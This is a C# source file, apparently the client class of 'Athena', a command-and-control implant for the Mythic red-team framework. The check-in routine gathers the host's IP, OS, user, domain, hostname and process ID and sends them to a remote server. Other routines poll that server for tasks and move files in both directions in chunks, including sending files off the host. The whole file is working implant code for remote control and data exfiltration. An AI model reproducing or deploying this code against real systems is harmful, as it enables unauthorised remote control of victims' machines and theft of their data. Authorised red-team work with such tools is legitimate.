using Athena.Commands.Model;
using Athena.Config;
using Athena.Mythic.Model;
using Athena.Mythic.Model.Response;
using Athena.Mythic.Model.Checkin;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new MythicConfig();
        }
        public CheckinResponse CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
            try
            {              
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if(cs == null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",

                    };
                }
                return cs;
            }
            catch
            {
                return new CheckinResponse();
            }
        }

        public List<MythicTask> GetTasks()
        {
            List<DelegateMessage> delegates = Globals.delegateMessages;
            Globals.delegateMessages = new List<DelegateMessage>();
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegates
            };
            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
                
                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                if (gtr != null)
                {
                    if(gtr.delegates != null && gtr.delegates.Count > 0)
                    {
                        foreach(var del in gtr.delegates)
                        {
                            Console.WriteLine($"Message for: {del.uuid}");
                            //Globals.outMessages.Add(del.uuid, del.message);
                            Globals.outMessages.Add(del);
                        }
                    }
                    return gtr.tasks;
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
        }

        public bool SendResponse(Dictionary<string,MythicJob> jobs)
        {
            List<DelegateMessage> delegates = Globals.delegateMessages;
            Globals.delegateMessages = new List<DelegateMessage>();
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach(var job in jobs.Values)
            {
                switch (job.task.command)
                {
                    case "upload":
                        MythicUploadJob uj = Globals.uploadJobs[job.task.id];
                        
                        if (!uj.uploadStarted) {
                            UploadResponse ur = new UploadResponse()
                            {
                                task_id = uj.task.id,
                                upload = new UploadResponseData()
                                {
                                    chunk_size = 512000,
                                    chunk_num = -1,
                                    file_id = uj.file_id,
                                    full_path = uj.path
                                }
                            };
                            lrr.Add(ur);
                        }
                        else if (uj.complete)
                        {
                            UploadResponse ur = new UploadResponse()
                            {
                                task_id = uj.task.id,
                                upload = new UploadResponseData()
                                {
                                    chunk_size = 512000,
                                    chunk_num = uj.chunk_num,
                                    file_id = uj.file_id,
                                    full_path = uj.path
                                },
                                completed = "true"
                                
                            };
                            lrr.Add(ur);
                        }
                        else
                        {
                            UploadResponse ur = new UploadResponse()
                            {
                                task_id = uj.task.id,
                                upload = new UploadResponseData()
                                {
                                    chunk_size = 512000,
                                    chunk_num = uj.chunk_num,
                                    file_id = uj.file_id,
                                    full_path = uj.path
                                },
                            };
                            uj.uploadStarted = true;
                            lrr.Add(ur);
                        }

                        break;
                    case "download":
                        MythicDownloadJob j = Globals.downloadJobs[job.task.id];

                        //Initiate Download
                        if (!j.downloadStarted)
                        {
                            DownloadResponse dr = new DownloadResponse()
                            {
                                task_id = job.task.id,
                                completed = "",
                                user_output = "",
                                status = "",
                                total_chunks = j.total_chunks,
                                full_path = j.path,
                                chunk_num = 0,
                                chunk_data = "",
                                file_id = "",
                            };
                            lrr.Add(dr);
                            j.downloadStarted = true;
                        }
                        else
                        {
                            //We're on the final chunk
                            if (j.chunk_num == j.total_chunks)
                            {
                                DownloadResponse dr = new DownloadResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = "",
                                    status = "",
                                    full_path = "",
                                    chunk_num = j.chunk_num,
                                    chunk_data = job.taskresult,
                                    file_id = j.file_id,
                                    completed = "true",
                                    total_chunks = -1
                                    
                                };
                                lrr.Add(dr);
                            }
                            //Upload next chunk
                            else
                            {
                                DownloadResponse dr = new DownloadResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = "",
                                    status = "",
                                    total_chunks = -1,
                                    full_path = "",
                                    chunk_num = j.chunk_num,
                                    chunk_data = job.taskresult,
                                    file_id = j.file_id
                                };
                                lrr.Add(dr);
                            }
                        }
                        break;
                    default:
                        if (job.errored)
                        {
                            ResponseResult rr = new ResponseResult()
                            {
                                task_id = job.task.id,
                                status = "error",
                                completed = "true",
                                user_output = job.taskresult
                            };
                            lrr.Add(rr);
                        }
                        else if (job.complete)
                        {
                            if (job.task.command == "load")
                            {
                                LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                                CommandsResponse cr = new CommandsResponse()
                                {
                                    action = "add",
                                    cmd = lc.name,
                                };
                                LoadCommandResponseResult rr = new LoadCommandResponseResult()
                                {
                                    task_id = job.task.id,
                                    completed = "true",
                                    user_output = job.taskresult,
                                    commands = new List<CommandsResponse>() { cr }
                                };
                                lrr.Add(rr);
                            }
                            else
                            {
                                ResponseResult rr = new ResponseResult()
                                {
                                    task_id = job.task.id,
                                    completed = "true",
                                    user_output = job.taskresult,
                                    status = "complete"
                                };
                                lrr.Add(rr);
                            }
                        }
                        else
                        {
                            ResponseResult rr = new ResponseResult()
                            {
                                task_id = job.task.id,
                                //completed = "false",
                                user_output = job.taskresult,
                                status = "processed"
                            };
                            lrr.Add(rr);
                        }
                        break;
                };
            }

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = lrr,
                delegates = delegates
            };

            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
                if (responseString.Contains("chunk_data"))
                {
                    PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
                    if (cs.delegates != null && cs.delegates.Count > 0)
                    {
                        foreach (var del in cs.delegates)
                        {
                            Console.WriteLine($"Message for: {del.uuid}");
                            //Globals.outMessages.Add(del.uuid, del.message);
                            Globals.outMessages.Add(del);
                        }
                    }

                    if (cs == null || cs.responses.Count < 1)
                    {
                        return false;
                    }
                    else
                    {
                        foreach(var response in cs.responses)
                        {
                            Task.Run(() =>
                            {
                                if (!String.IsNullOrEmpty(response.chunk_data))
                                {
                                    try
                                    {
                                        MythicUploadJob uj = Globals.uploadJobs[response.task_id];
                                        MythicJob job = Globals.jobs[response.task_id];
                                        uj.total_chunks = response.total_chunks;
                                        uj.chunk_num = response.chunk_num;
                                        if (!uj.chunkUploads.ContainsKey(response.chunk_num))
                                        {
                                            //Lock the Dictionary<int,string>()
                                            uj.locked = true;
                                            uj.chunkUploads.Add(response.chunk_num, response.chunk_data);
                                            //Unlock the Dictionary so that it can be written
                                            uj.locked = false;
                                        }
                                    }
                                    catch
                                    {

                                    }
                                }
                            });
                        }
                    }
                }
                else
                {
                    PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);

                    if (cs.delegates != null && cs.delegates.Count > 0)
                    {
                        foreach (var del in cs.delegates)
                        {
                            Console.WriteLine($"Message for: {del.uuid}");
                            //Globals.outMessages.Add(del.uuid, del.message);
                            Globals.outMessages.Add(del);
                        }
                    }

                    if (cs == null || cs.responses.Count < 1)
                    {
                        return false;
                    }
                    else
                    {
                        foreach (var response in cs.responses)
                        {
                            if (!String.IsNullOrEmpty(response.file_id))
                            {
                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
                                if (string.IsNullOrEmpty(j.file_id))
                                {
                                    j.file_id = response.file_id;
                                    j.hasoutput = false;
                                }
                            }
                        }
                    }
                } 
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
            return true;
        }
    }
}
